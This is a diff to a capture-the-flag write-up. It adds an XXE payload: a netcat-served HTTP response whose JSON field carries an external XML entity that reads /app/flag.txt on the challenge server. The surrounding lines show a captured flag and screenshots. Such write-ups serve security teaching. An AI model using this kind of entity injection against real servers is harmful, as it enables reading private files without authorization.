@@ -213,7 +213,13 @@ Flag-:```PCTF{Imp3rs0n4t10n_Iz_Sup3r_Ezz}```
 
 ![image](https://github.com/user-attachments/assets/28d64d48-c0d4-40fd-9ed2-931f98d71926)
 
-- The flagfile is located in `/app/flag.txt`.Flag
+- The flagfile is located in `/app/flag.txt`.Flag's payload
+
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=UTF-8
+      Server: netcat!
+      
+      {"Comment":"<!DOCTYPE foo [<!ENTITY example SYSTEM '/app/flag.txt'> ]><p>&example;</p>"}
 
 ![image](https://github.com/user-attachments/assets/3371604f-7d78-475a-8289-fa0b44140f20)
 
